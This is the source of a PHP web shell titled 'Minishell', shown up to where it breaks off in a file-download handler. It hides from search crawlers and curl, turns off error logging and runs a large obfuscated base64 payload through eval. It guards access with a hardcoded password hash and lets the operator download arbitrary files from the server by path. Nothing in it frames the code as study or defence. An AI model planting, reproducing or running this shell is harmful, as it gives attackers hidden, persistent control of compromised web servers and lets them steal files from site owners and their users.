<?php
session_start();
@error_reporting(0);
@set_time_limit(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')) {
    @set_magic_quotes_runtime(0);
}
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$password = "fa128332ba0c2ace04c249f2b4b7f464"// md5: ph.luffy1337
$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
$FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
error_reporting(0);
error_log(0);
eval(base64_decode("\x5a\x58\x5a\x68\x62\x43\x68\x6e\x65\x6d\x6c\x75\x5a\x6d\x78\x68\x64\x47\x55\x6f\x633\x52\x79\x58\x33\x4a\x76\x64\x44\x45\x7a\x4b\x47\x4a\x68c\x32\x55\x32\x4e\x46\x39\x6b\x5a\x57\x4e\x76\x5a\x47\x55\x6f\x4a\x30\x52\x6b\x57\x6c\x4e\x79\x63\x31\x64\x4a\x52\x6c\x46\x55\x55\x54\x56\x68\x55\x57\x70\x45\x4f\x48\x6c\x72\x61\x6b\x6f\x32\x57\x6d\x31\x54\x59\x33\x52\x4e\x65\x6b\x34\x33\x4f\x57\x5a\x73\x63\x55\x49\x32\x56\x31\x4d\x33\x63\x57\x35\x35\x56\x6a\x52\x6b\x4c\x7aZ\x78\x4b\x32\x52\x78\x61\x55\x55\x35\x65\x57\x34\x72\x65\x56\x70\x35\x4f\x45o\x33\x54\x69\x74\x70\x65\x6b\x39\x6c\x61\x53\x39\x49\x55\x53\x39\x30\x62\x69\x73\x7a\x4b\x31\x6c\x45\x55\x6d\x59v\x4e\x47\x70\x79\x5a\x32\x38\x34\x55\x31\x4a\x79\x4d\x57\x4e\x32\x59\x6c\x6f\x30\x55\x79\x38\x30\x51\x32\x30\x33\x61\x57\x5a\x53\x51\x58\x59\x78\x61\x33\x5a\x49a\x6c\x5a\x68\x56\x57\x39\x42\x65\x58\x70\x73\x4d\x6b\x46\x50\x5a\x45\x35\x45\x4e\x33\x63\x72\x61\x44\x4e\x54\x4f\x57\x52\x4a\x5a\x58\x52\x4b\x61\x46\x56\x6d\x52\x55\x74\x77\x54\x6c\x42\x51\x5a0\x68\x50\x64\x32\x31\x49\x59\x57\x74\x35\x53\x45\x31\x76\x59\x6a\x68\x47\x5a\x44\x42\x6c\x59\x32\x30\x78\x53\x48\x63\x32\x53\x43\x73\x32\x65\x45\x56\x58\x52\x56\x45\x77\x55\x47\x52\x44\x65\x45\x77\x7a\x54\x31\x41\x78\x64\x33c\x79\x54\x44\x56\x58\x62\x6b\x46\x52\x4d\x6c\x4e\x32\x57\x6e\x46\x78\x63\x45\x34\x77\x4d\x54\x450\x51\x6d\x67\x34\x62\x44\x56F\x4f\x57\x59\x32\x52z\x4a\x30\x62\x54\x68\x77\x64\x57\x78\x32\x56\x6c\x46\x4c\x5a\x33\x4a\x78\x65\x6c\x5a\x6b\x4e\x30\x31\x50\x53\x54\x4e\x78\x61\x57\x73\x35\x64\x55\x59\x31\x61\x6a\x52\x68\x62\x33\x4d\x76T\x32\x70\x6b\x55\x46\x6c\x45Z\x56\x63\x72\x62\x46\x4d\x72M\x69\x39\x4c\x4b\x30\x46\x49\x55\x45\x56\x78U\x6a\x45\x30\x63\x46\x70\x45\x57\x47\x4e\x4e\x64\x54\x4e\x46\x4f\x44\x59\x31\x56\x56\x67\x76\x65\x58\x56\x6d\x52\x47\x56T\x55\x47\x39\x6b\x4e\x6b\x46\x74\x51\x58\x42\x50\x65\x6b\x78\x78\x4d\x7a\x52\x31\x62\x32\x6c\x54\x61\x31\x6c\x4a\x54\x53\x73z\x57\x57\x39\x54\x62\x45\x31\x30\x5a\x32\x6b\x76\x4d\x6e\x4a\x57\x4f\x45\x39\x55\x4d\x32\x56\x45\x4d\x32\x70\x53\x64\x47\x4a\x35\x55\x54\x56\x46\x63\x58J\x30\x59\x33\x68\x57\x64\x45\x59\x34\x63\x6c\x70\x54\x53\x48\x68\x44\x4c\x30\x70\x46\x4e\x47\x35\x43\x4b\x33\x68\x45\x55\x7a\x46\x68\x52\x6d\x70\x54\x56\x32\x5a\x6e\x56\x55R\x57\x63\x6b\x4e\x53\x59\x54\x67\x79\x64j\x42\x4f\x57\x45\x35\x6a\x54\x6a\x68\x49\x64\x6e\x6c\x58\x65\x57\x5a\x48\x63\x30\x6f\x35\x4f\x43\x39\x52\x52\x33\x6c\x50\x5a\x55\x55\x78\x63\x30\x51\x31\x52\x55\x52\x74\x55\x53\x39\x56\x65\x6c\x56\x32\x56\x6d\x46\x76\x4b\x32\x70P\x5a\x6b\x46\x5a\x53\x48\x6c\x4e\x61\x56\x42\x43\x4d\x6b\x56\x46\x63\x58\x67\x31\x4d\x32\x4e\x30\x62\x47\x6c\x6b\x52\x6c\x4a\x6a\x4c\x7a\x55\x76R\x46\x70\x79\x61\x6d\x5a\x71L\x32\x39\x49\x4d\x57\x39L\x57\x6e\x42\x56\x55\x6a\x42\x72\x4e\x6dd\x6e\x57\x6b\x6c\x5a\x4e\x43\x39\x30\x54\x54\x56\x33\x4c\x32\x78J\x52\x6c\x6c\x49\x62\x44\x64\x77\x4c\x32\x78\x71\x53\x48\x6c\x33\x4f\x57\x73\x33\x5a\x45\x39\x35\x64\x30\x56\x74\x56\x6e\x5a\x78\x54\x6a\x56\x4aM\x6d\x4a\x6b\x63\x7a\x45\x34\x56\x6d\x64\x55\x64\x30\x4a\x54\x54\x48\x52\x47\x64\x48\x52\x6a\x61\x55\x70\x71\x4f\x58\x68\x71\x63\x47\x46\x35\x51\x32\x6c\x48\x56\x6e\x68\x47\x4e\x56\x70\x6e\x64\x56\x6b\x79\x55\x6d\x56\x55\x59\x32\x31\x45\x65\x56\x41\x76\x55\x54\x4ej\x56\x6d\x6c\x77\x53\x56\x49\x7a\x4d\x33d\x52\x57\x6a\x6c\x43\x51\x6d\x52P\x53\x6d\x6c\x6f\x54\x57\x46\x56\x52\x58\x70\x34\x4d\x6b\x6c\x79\x64\x6b\x78\x70\x57\x55\x52\x42\x4d\x33\x46\x69\x61\x48\x56\x5a\x62\x6e\x46\x6c\x4f\x57\x67\x35\x4c\x33\x52\x6a\x57\x53\x39\x4e\x65\x48\x5a\x42\x63\x57\x64\x4d\x55\x45\x68\x43\x5a\x6c\x56\x46\x4f\x45\x4a\x61\x53\x58\x56\x45\x61\x30\x6c\x51\x5a\x44\x5a\x51\x4d\x45\x56\x51\x52\x6e\x67\x72\x4d\x32\x6c\x55\x56\x58\x67\x79\x56\x6a\x49\x76\x5ajh\x52\x64\x6e\x68\x74\x64\x55\x74\x77\x57\x47\x55\x7a\x5a\x56\x46\x59\x55\x6a\x6c\x68\x62\x48\x5a\x58\x52\x48\x6bx\x54\x57\x64\x61\x4f\x47\x5a\x32\x54\x33\x46\x4f\x62\x69\x74\x59\x55\x6a\x49\x7a\x4f\x45\x38\x34\x61\x6a\x59\x78\x51\x6a\x4a\x45\x4d\x30\x31\x44\x53\x46\x6c\x72\x56\x7a\x46\x30\x4d\x6c\x46\x75\x55\x47\x4e\x74\x53\x6d\x39\x77\x4en\x45\x78\x53\x6a\x4a\x59\x63\x46\x56\x76\x62\x6c\x4a\x72\x57\x6b\x68\x78\x57W\x6c\x50\x62\x47\x4a\x57\x51\x33\x70\x56\x55\x6b\x39\x44\x5a\x47\x68\x74\x53\x56\x6f\x76\x5a\x55\x67\x7a\x64\x6c\x56\x5a\x63\x55\x46Z\x62\x58\x63\x72\x56\x56\x6f\x76\x55\x6d\x31\x31\x51\x6eh\x44\x52\x6e\x52\x56\x53\x30\x4e\x53\x64\x57\x4a\x50\x57\x6d\x4e\x43\x51\x31\x56\x48\x57\x6d\x6c\x53\x59\x57\x78\x76\x54\x31\x70\x46\x53\x32\x31\x72\x56\x30\x52\x44\x52\x33\x42\x73\x5a\x55\x68\x32\x51\x6a\x4e\x56\x4d\x79\x74\x69\x4e\x6a\x49\x32\x4d\x6c\x68\x59\x55\x32\x49\x78\x63\x57\x4d\x7a\x51\x6aN\x6f\x52\x33\x42\x52\x57\x55\x6c\x47\x4d\x6b\x46\x51\x62\x32\x55\x34\x57\x6d\x45\x78\x4f\x55\x5a\x71\x61\x7a\x46\x48\x51\x55\x6c\x47\x5a\x31\x45\x35\x53\x47\x52\x4a\x5a\x47\x35\x59\x54\x47\x6b\x78\x54\x56\x49\x7a\x53X\x51\x35\x55\x46\x64\x42\x59\x54\x5a\x6c\x55\x48\x64\x44\x5a\x56\x6f\x76\x5a\x44\x46\x6b\x56\x32\x56\x51\x56\x30\x78\x32\x53\x56\x68\x73\x52\x54\x68\x6b\x59\x32\x63\x35\x54\x6c\x5a\x35\x53\x6b\x30\x34\x55y\x74\x6d\x51\x7a\x68\x4d\x4f\x45\x68\x6c\x4d\x6d\x67\x34\x57\x55\x74\x46\x4f\x45\x6c\x4b\x65\x6d\x38\x34\x54\x32Z\x32\x56\x6a\x4a\x4a\x5a\x6a\x4a\x56\x64\x55\x46\x6b\x59\x32\x74\x31\x57\x55\x52\x42\x54\x6e\x64\x43\x55\x58\x49\x33\x53\x6d\x4a\x76\x63\x58\x42\x79\x59\x54\x5a\x42\x4f\x56\x64\x57\x52\x6c\x42\x48\x57\x53\x39\x55\x53\x6d\x39\x77\x5a\x30\x39\x59\x64\x31\x6b\x77\x5a\x32\x4d\x33\x63\x55\x68\x55\x54\x32\x46\x6b\x62\x6blW\x63\x48\x41\x35\x61\x6c\x49\x34\x54\x55\x4a\x69\x5aG\x70\x75\x59\x6a\x64\x47\x63\x45\x4d\x77\x54\x48\x52\x49\x62\x57\x4d\x33\x53\x32\x38\x77\x56\x6a\x51\x35\x61\x58\x4a\x47\x62\x31N\x51\x63\x58\x4a\x75\x54\x58\x70\x74\x55\x6e\x70\x46\x51\x56\x6c\x51\x57\x44\x6c\x44\x53\x6d\x78\x50\x62\x46\x70\x71\x64\x32\x5a\x54\x54\x54F\x58\x4e\x45\x68\x43\x65\x48\x70\x77\x51\x6b\x4a\x45T\x69\x74\x4d\x61\x32\x4e\x68\x4d\x47\x4e\x57\x5a\x48\x45\x7a\x59\x30\x78\x36\x4cz\x5a\x43\x62\x33\x4a\x72\x64\x57\x78\x54\x63\x6c\x70\x45\x4e\x6b\x56\x56\x54\x6d\x46\x61\x65\x6d\x4a\x69\x5a\x33\x4a\x79\x61\x32\x30\x35\x4d\x6d5\x79b\x58\x64\x61\x62\x57\x67\x72\x4d\x30\x35\x4c\x4e\x53\x74\x45\x55\x6c\x4a\x70\x54\x6aR\x4d\x54\x44\x6c\x36\x5a\x7a\x6c\x49\x53\x46\x64\x57\x56\x6a\x4a\x42\x56\x55\x64\x77\x64\x55\x78\x4e\x59W\x56\x4b\x56\x46\x6b\x77\x590\x52\x73\x65\x6b\x39\x78\x55\x47\x64\x75\x56\x31\x68\x47\x56\x57\x4e\x54\x5a\x47\x46\x72\x64\x55\x31\x34\x52\x31\x4a\x76\x623\x64q\x4d\x69\x39\x6d\x63\x47\x4a\x61\x54\x6c\x64\x4a\x61\x47\x59\x7a\x55\x31\x4e\x35\x4e\x47\x52\x54\x51\x55\x59\x72\x51\x6e\x70\x4c\x4d\x6b\x6b\x35\x63\x56\x4d\x30\x56\x47\x6c\x69\x64\x47\x45\x78\x4e\x45\x5a\x34\x64\x33\x56\x50\x5a\x44\x49\x34\x4d\x57\x74\x4a\x65\x57\x78\x43\x51\x6a\x56\x79\x56\x58\x68\x53\x54\x58\x46\x6c\x55\x31\x70\x7a\x57\x6d\x4a\x54\x63\x45\x6c\x46\x65W\x46\x74\x4d\x58\x68\x47\x65\x6d\x67\x78\x63\x6e\x5a\x6e\x55\x7a\x67\x31\x5a\x6a\x46\x46\x4d\x46\x4d\x7a\x51\x30\x46\x49\x63\x46\x52\x57\x62\x30\x46F\x53\x30d\x49\x4d\x7a\x4e\x6c\x59\x6b\x31\x57\x59\x32\x68\x4c\x65\x45\x74\x61\x52\x6c\x42\x52\x55\x54\x52\x53\x63\x6b\x45\x78\x63\x7a\x4e\x76\x54\x33\x46\x72\x63\x7a\x42\x35\x56\x32V\x68\x62\x6e\x64\x77\x4fG\x52\x4f\x4e\x54\x4a\x31\x55\x6b\x39\x33\x54\x46\x4e\x56\x51\x6d\x5a\x35\x54\x56\x4e\x71\x54\x46\x6b\x33W\x56\x64\x77\x55\x58\x4a\x7a\x4b\x33\x68\x53\x65\x55\x56\x68\x62\x7a\x67\x32\x52\x7a\x67\x79\x4e\x6dd\x6c\x63\x57\x31\x4c\x54\x6a\x56\x48\x53\x33\x68\x4cO\x54\x6b\x79\x53\x7a\x6c\x4c\x57\x6b\x56\x53\x51\x32\x78\x42\x54\x7a\x5a\x61\x62\x30Z\x36\x56\x58\x56\x4e\x51\x6d\x35\x4d\x51\x57\x56\x78\x4f\x45\x56\x73\x61\x31h\x58\x61\x45\x70\x53\x55\x31\x42\x73\x56\x33\x42\x73\x61\x44\x56\x59\x64\x45\x49\x30\x53\x48\x4e\x72\x4e\x6b\x70\x56\x63m\x4a\x42\x61\x45\x4a\x32\x65\x44\x4a\x59\x61\x6a\x6c\x76\x4d\x47\x31\x77\x52\x44\x6c\x6a\x57\x44\x4a\x68\x51\x55\x46\x77\x4f\x48\x5a\x6f\x59\x58\x6c\x56\x56\x33\x64\x46\x4d\x47\x51\x35\x4e\x6b\x64\x78\x56\x6b\x4dr\x59\x57\x4a\x4e\x5a\x31\x67\x32\x52\x57\x67\x72\x53\x45\x4a\x6b\x4d\x31\x52\x7aS\x46\x49\x78\x55\x57\x6b\x35\x4e\x30\x46\x69\x4f\x56\x4e\x50\x59\x6d\x35\x4b\x4f\x57\x64\x6c\x4d\x33\x42\x6a\x4f\x48\x70\x49d\x43\x74\x70\x55\x58\x5a\x54\x56\x6d\x6cM\x62\x6d\x5a\x30\x53\x33\x52\x6d\x52\x47\x68\x51\x55\x32\x78\x55\x5a\x6d\x5a\x45\x56\x69\x38\x7a\x51\x7a\x42\x78\x64\x55\x68\x51\x53\x57\x35\x61N\x46\x4e\x33\x55\x6a\x56\x43\x59\x6d\x39\x33\x4d\x55\x70\x61\x5an\x46\x74\x53\x32\x39L\x4d\x55\x70\x43\x62\x30\x51\x33\x59\x31\x52\x52\x53\x32\x4e\x68\x54\x32\x70\x49\x61\x6c\x56\x43\x4c\x31\x45\x31\x52\x44\x671\x65\x44\x4a\x57\x4d\x44\x52\x70\x57\x47\x38\x32\x4d\x6c\x45\x30\x53\x48\x4e\x4f\x5a\x55\x56\x69\x52\x54\x41\x35\x4d\x30\x4a\x32\x62\x47\x39\x34\x52\x58\x52\x68\x54\x6b\x78\x79\x51\x6e\x4a\x32\x61\x47\x4e\x32\x54j\x46v\x55\x43\x39\x49\x57j\x68\x71\x53\x55\x70\x59\x55\x48\x64\x5a\x64\x48\x4e\x36\x62\x32\x31\x34\x64\x44\x4a\x34\x64\x31\x46\x53\x4c\x7a\x56\x4dU\x45\x64\x75\x63\x6bp\x35\x53\x31\x4e\x73\x4d\x43\x39\x6c\x65\x45\x74\x57\x57\x54J\x53\x52\x31\x70\x5a\x52\x31\x42\x34\x4e\x47\x52\x57\x63\x30\x74\x74\x62n\x70\x36\x52\x55\x35\x49\x55\x32\x35\x47\x5a\x33c\x31\x59\x6d\x64\x78\x4f\x57\x5a\x73\x5a\x6d\x39\x31\x65\x55\x39\x69\x64\x57\x64\x35\x52\x6e\x6b\x30\x52\x6d\x68\x57\x53\x6b\x68\x50\x4e\x44\x52\x4d\x64\x55\x68\x36\x4e\x54\x4a\x75\x57\x57\x5a\x46\x53\x32\x6c\x78\x56\x45\x56\x53\x56\x6c\x51\x32\x61\x55\x49\x72\x57\x58\x42\x56\x63\x47\x59\x76\x55\x57\x45\x32\x4d\x55\x64\x72\x4c\x30\x70\x77\x52\x6e\x4a\x73\x55\x48\x56\x75\x56\x48\x42\x49\x61\x6d\x70\x70\x4d\x47\x56\x53\x64\x45\x4d\x31\x53\x30\x6c\x70\x64\x6b\x31\x57\x53\x53\x39\x4a\x51\x32\x70\x6c\x63\x47\x34\x76\x57\x45\x5a\x31\x55\x69\x74\x45\x64\x57\x67\x33\x64\x45\x5a\x4a\x4d\x7a\x4e\x31\x4d\x32\x4e\x42\x54V\x56\x75\x61\x55\x46\x4c\x4f\x57\x51\x30\x5a\x6d\x4e\x53\x61\x45\x52\x44\x52\x30\x46\x73\x53\x46\x4e\x48\x55\x6c\x52\x59\x55\x6d\x38\x34\x61\x47\x35\x72\x5a\x55\x45\x35\x4e\x7a\x46\x33\x65\x55\x64\x73\x62\x6c\x70\x74\x59\x54\x51\x31\x63\x56\x64\x4a\x53\x33\x5a\x73\x55\x6a\x5a\x6f\x64\x58\x68\x5a\x4c\x7a\x6c\x6b\x54\x54\x4dx\x56\x54\x42\x52\x55\x31\x64\x74\x59\x57\x38\x72\x5a\x30\x5az\x52\x43\x73\x78\x56\x33\x68\x31\x51\x55\x78\x69\x57\x6e\x68\x6c\x52\x6a\x68\x30\x4e\x7a\x46\x4d\x4c\x30\x46\x51\x52\x48\x4e\x35\x61\x58\x4a\x54\x59\x6d\x39\x6a\x57\x57\x39\x44\x55\x45\x52\x4c\x56\x33\x42\x6d\x51\x53\x39\x50\x52\x33\x42\x71\x4d\x58\x6c\x4a\x56\x6b\x35\x70\x63H\x6c\x45\x51\x6a\x52\x34\x4e\x6d\x64\x73\x54\x57\x4a\x5a\x54\x31\x46\x36\x4e\x6eJ\x53U\x45\x56\x75\x53\x55\x6c\x30\x54\x30\x4d\x78\x59\x6c\x68\x47\x57\x47\x78\x30\x64\x30\x78\x52\x52\x54\x6c\x61\x63\x32\x5a\x6c\x4d\x55p\x57\x61\x44\x64\x44\x56\x54\x4a\x70\x62\x6d\x46\x34\x5a\x56\x42\x4d\x52\x54\x4e\x6d\x4f\x55\x6c\x30\x56\x6b\x49\x34Y\x31\x42\x35\x5a\x7a\x49\x31\x4d\x69t\x77\x55\x6b\x74\x54\x52\x57\x74\x52\x59\x6e\x70\x6a\x4e\x6d\x78\x32Y\x56\x42\x43\x4d\x6d\x68\x34\x63\x30\x70\x75\x61\x6c\x4a\x35\x4e\x57\x68\x55\x57\x57\x78\x56\x63\x47\x52\x4e\x59\x6e\x46\x34\x64\x6c\x4e\x55\x5a\x6b\x35\x42\x61\x69\x74\x51\x56\x6b\x56\x56\x55\x54U\x35\x56z\x42\x51\x54\x33\x56\x33\x62\x48\x64\x4a\x64\x6c\x42\x69\x54\x47\x35\x5a\x55\x57\x6c\x42\x52\x47\x78\x77\x5a\x48\x52\x52\x51\x33\x5a\x30\x63W\x5a\x35d\x48\x56\x50R\x47\x35\x79\x52\x58\x70\x30\x53\x54\x63\x31\x4e\x30\x56\x57\x63\x44\x68\x4c\x63\x58\x6c\x50\x4d\x56\x67\x72\x4d\x6a\x56\x43\x51\x6e\x70\x6e\x4e\x47\x78\x4d\x62\x33\x42\x5a\x61\x33\x52\x51\x64\x55\x4e\x6a\x53\x54\x64\x43\x55\x47\x6b\x78\x55\x6c\x6c\x6d\x56\x58\x56\x77\x57\x46\x68\x55\x5a\x58\x42\x6c\x52\x57\x68\x48\x4d\x56\x4a\x59\x55\x48\x4e\x50\x4d\x48\x51\x32\x4e\x32\x56\x78\x4b\x32\x35\x4c\x54\x33\x4d\x76\x55\x30\x46\x48\x51\x56\x67\x31\x63\x47\x74\x75\x65\x48\x68\x34\x56\x46\x56\x4a\x62\x55\x56\x50\x63\x31\x4a\x6d\x53\x6e\x42\x54\x5a\x57\x5ah\x4e\x30\x78\x4e\x57\x44\x42X\x57\x56\x56\x72\x59\x57\x56\x7a\x52\x31\x56\x49\x59\x57\x64\x42b\x6b\x78n\x5a\x6d\x49\x34\x56\x6d\x39\x71\x52\x6b\x52\x32\x56\x32\x5a\x59\x4b\x7a\x41\x32\x51m\x78\x5a\x51\x57\x31\x75\x5a\x46\x46\x79\x55\x55\x78\x49\x4b\x33\x42\x61\x62\x44\x6c\x6b\x4d\x47\x4e\x31\x53\x56\x68\x32\x53\x56\x70\x6e\x5aV\x5a\x35\x54\x58\x63\x32\x64\x54\x5a\x51\x57\x54\x4e\x4d\x53\x56\x42\x4a\x61\x6b\x68\x36\x51\x55\x31\x6b\x65\x58\x70\x50\x4e\x47\x6c\x58\x55\x54\x46\x4a\x59\x58\x56\x58\x63\x6d\x5as\x63\x32\x35\x44\x62\x6e\x6br\x54\x6d\x70\x6e\x56\x56\x70\x72\x5a\x32\x49\x31\x63\x32\x6c\x53\x55\x6d\x39\x54\x62\x31M\x35\x61\x6a\x4e\x77\x4fV\x56\x75\x54\x56\x70\x57\x56\x33\x52U\x5a\x57\x6f\x34\x57\x56\x6c\x31\x65\x55\x5a\x71\x57\x55\x68\x77\x4d\x30\x31\x56\x64\x7a\x46\x47\x62\x6b\x4a\x31\x59\x6e\x4e\x77\x55\x57\x4e\x4a\x56\x6b\x74\x30\x56\x57\x5at\x57\x6c\x68\x50\x4c\x33\x42\x45\x65\x47\x64\x43\x4c\x32\x34\x34\x4f\x55\x742\x4e\x54\x5a\x55\x4dz\x42\x33\x4c\x33\x64\x79\x4e\x56\x6f\x78\x54\x55\x52\x33\x57\x44\x67\x31\x63\x31\x5a\x7a\x55\x55\x59\x34\x62\x6a\x5a\x68\x54\x44\x68\x59\x52\x6c\x64\x44\x4f\x43\x74\x7a\x4d\x33\x46\x45\x65\x6b\x64\x6dU\x54\x4e\x72\x4f\x55\x59\x35\x54\x33\x46\x4a\x64\x6d\x74\x34\x55\x55\x70\x69\x59\x6d\x63\x35\x52\x57\x70\x30\x56\x57\x70\x6a\x62\x45\x5a\x43\x61\x56\x63\x72\x5a\x47\x39\x4f\x59\x57\x70\x6a\x4d\x44\x51\x76\x61\x45\x46\x36\x59\x69\x74\x74\x63\x69\x73\x72M\x30\x46\x4b\x62\x55\x68\x4c\x4f\x58\x52\x75\x53\x48\x56\x4b\x56\x44\x51\x33\x65\x55\x68\x30\x52\x54\x59\x78\x59\x6c\x63\x78\x56\x55\x5a\x69\x52\x57\x35\x35\x51\x54\x4e\x47\x56\x31\x56\x53\x61\x32\x46\x5ae\x55\x74\x30\x4f\x58\x55\x72\x62\x44\x49\x72\x55\x6b\x70\x4d\x52\x56\x4e\x35\x64\x55\x78\x54V\x46\x4e\x79\x51\x58N\x33\x57\x56\x6c\x32\x65\x69\x74\x53\x59\x57\x64\x4f\x63\x55\x31v\x57\x56\x46\x45\x61\x48\x42\x71\x56\x45\x5a\x4e\x63\x55\x78\x54\x62n\x70\x49\x57\x53\x39\x78\x65\x6e\x4a\x45\x4f\x55\x68\x50\x61\x58\x70\x33\x54\x44\x52\x4bZ\x44\x56\x34\x62\x6c\x68\x6c\x4e\x47\x35\x73\x54\x56\x56\x70\x63\x6b\x31\x30\x5a\x55\x67\x33\x5a\x6e\x6c\x77\x4f\x46\x64\x77\x64\x6b\x74\x61\x52\x55\x63\x7a\x57\x55\x68\x6e\x4e\x7a\x56R\x63\x44\x41\x30\x4e\x47\x74\x46\x57\x57\x31\x75\x64\x46\x70\x58\x4d\x31\x46\x33e\x57\x6f\x31\x4d\x30\x70\x45\x61\x56\x49\x32\x51\x6d\x35\x69\x5a\x30\x52\x4f\x5a\x55\x68\x47\x61\x47\x68\x4f\x55\x6c\x41\x79\x54\x32\x46\x59\x4d\x45\x52\x78\x52\x54\x64\x6c\x59\x6d\x74\x57\x51\x33\x4a\x55\x61\x6d\x39\x57\x4e\x6b\x5a\x47\x5a\x6c\x67\x33\x4e\x54\x4e\x50\x64\x58\x4e\x52\x59\x30\x6c\x56\x4e\x6d\x68\x56\x4d\x57\x4a\x53\x64\x58\x70\x6b\x64\x45\x64\x30\x52\x44\x51\x76\x61\x7a\x49\x76\x4e\x54\x55\x35\x65\x47\x4e\x75\x62\x56\x42\x31\x61\x45\x31\x4bN\x44\x6c\x30\x55\x6b\x31\x49b\x31\x5a\x59\x5a\x33\x46\x36\x65\x57\x68\x53\x62\x58\x6c\x56\x51\x55\x4ao\x55\x43\x38v\x63\x44\x46\x57\x62\x45\x39\x4d\x64\x54\x56\x61\x4e\x6dh\x36\x54\x6c\x55\x79\x5a\x44\x68\x58\x57\x6b\x34\x35\x51\x6c\x5a\x4f\x4d\x45\x56\x7a\x54\x55\x68\x61\x56\x30\x6c\x61\x55\x6c\x42\x31\x5a\x58\x6f\x33\x54\x6d\x4a\x47\x4c\x33\x4d\x72\x4fX\x4d\x7a\x65\x6c\x5a\x52\x61\x43\x74\x4f\x61\x58\x51\x32\x61\x57\x68\x55\x4e\x6c\x55\x35\x62\x32\x5a\x42\x64\x30\x4e\x4c\x62\x44\x42\x74\x61\x57\x30\x35\x4f\x44\x4e\x77\x54\x33\x6c\x58\x5a\x6b\x31\x70\x53\x6e\x64\x36\x56\x6e\x67\x72\x4e\x45\x35\x55\x51\x56\x68\x43\x560\x51\x35\x53\x6b\x68\x70\x5a\x69\x74\x4e\x5a\x48\x42\x71\x64\x6b\x68y\x64\x47\x74\x34\x53\x30\x6c\x72\x57\x46\x6c\x74\x55\x6b\x70\x79\x64\x7a\x68\x33\x53\x43\x74\x6e\x55\x58\x46\x4ea\x48\x63\x77\x64\x45\x46\x6b\x56\x46N\x4c\x65\x58\x6c\x57\x62\x6b\x35\x6d\x4e\x6c\x52\x43\x53\x46\x46\x35\x55\x30\x31\x75\x55\x57\x6c\x77\x52\x33\x52\x35\x4e\x6b\x5a\x30\x62\x31\x70\x7a\x5a\x54\x4a\x4a\x52\x55V\x32NT\x6c\x33\x5aG\x67\x31\x4d\x58\x64\x4b\x54\x58\x68\x33\x64\x55\x39\x78\x56\x55\x64\x73\x4d\x7a\x67\x7a\x59\x6b\x5a\x6b\x5a\x31\x52\x68\x61\x6e\x67\x31\x62\x44\x56\x5a\x62\x47\x6c\x49\x65\x46\x70\x43\x4d\x47\x39\x35\x4e\x32\x74\x49\x52\x56\x46\x6d\x52\x55\x4e\x6c\x4d\x32\x4a\x32\x63\x58\x42\x56\x52V\x67\x30\x4f\x47\x4a0\x57\x6e\x46\x6c\x62\x48\x59\x31\x4d\x48\x68\x43\x4d\x6b\x4e\x4e\x64\x47\x74\x44\x4d\x6c\x41\x78\x4d\x6c\x52\x58\x4e\x55\x4e\x43\x54\x32\x74\x61\x59\x7a\x42\x55\x63\x47\x4e\x76\x4e\x55\x46\x42\x63\x55\x64\x4a\x62\x46\x46\x7a\x61\x6e\x55\x35\x52\x32\x5a\x50\x61\x31\x5a\x76\x63\x79\x74\x56\x55\x55\x35\x75\x4d\x7a\x4e\x74\x64\x32\x4e\x76\x52\x46\x42\x4e\x56\x32\x4e\x78\x56\x30\x704\x54\x57\x68\x43\x4e\x7a\x4eD\x52\x33\x70\x76\x59\x33\x52\x59\x65\x58\x42\x32\x61\x46\x4e\x6e\x54\x6e\x6c\x59\x56\x6e\x42\x55\x56\x57\x46\x79\x4e\x6e\x70\x59\x57\x58\x55\x31\x4d\x31\x46\x74\x4e\x6b\x64\x55\x63\x6b\x4d\x33\x52\x6a\x56\x42\x55\x6a\x56\x32\x62\x6a\x56\x57\x52\x54\x46\x59\x62\x45\x49\x30\x52\x53\x74\x56\x5a\x57\x39\x49\x62\x56\x4a\x75\x65\x57\x73\x32\x51\x6e\x6c\x31\x62\x7a\x46\x72\x53\x55\x5a\x75\x54\x58\x70E\x64G\x6f\x31\x61\x7a\x56\x4c\x52\x6e\x46\x54\x53\x55\x6c\x44\x56\x46\x6c\x4a\x62\x55\x4e\x73\x55\x43\x74\x6d\x4c\x79\x38\x33\x5a\x43\x38\x76N\x46\x41\x6e\x4b\x53\x6b\x70\x4b\x54\x73\x3d"));

function login_shell() {
?>
<!DOCTYPE HTML>
<html>
<head>
<title>Minishell</title>
<link rel="icon" type="image/png" href="https://i.ibb.co/3Cy693j/1594250405941.png">
<style type="text/css">

html {
    margin: 20px auto;
    background: #000000;
    color: black;
    text-align: center;
}
header {
    color: cyan;
    margin: 10px auto;
}
input[type=password] {
    width: 250px;
    height: 25px;
    color: blue;
    background: transparent;
    border: 1px dotted red;
    margin-left: 20px;
    text-align: center;
}
</style>
</head>
<img src="https://i.ibb.co/RPTXM4g/received-659554504768398.png" height="250px" width="200px"> 

<form method="post">
<input type="password" name="password">
</form>
<button id="Uwu" onclick="play();liat();">Login! </button>
<script type="text/javascript"></script><audio id="lagu" src="https://l.top4top.io/m_156340x9u0.mp3"></audio></script> <style>body 
blockquote:after { content: "\2013 \2003" attr(cite); display: block; text-align: right; font-size: 0.875em; color: #000000;}</style><script>function play(){ var audio = document.getElementById("lagu"); audio.play();} function liat(){ document.getElementById('galiat').style.visibility="visible"; } </script>
</center>
<center>
<header>
    <pre></pre>
</header>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
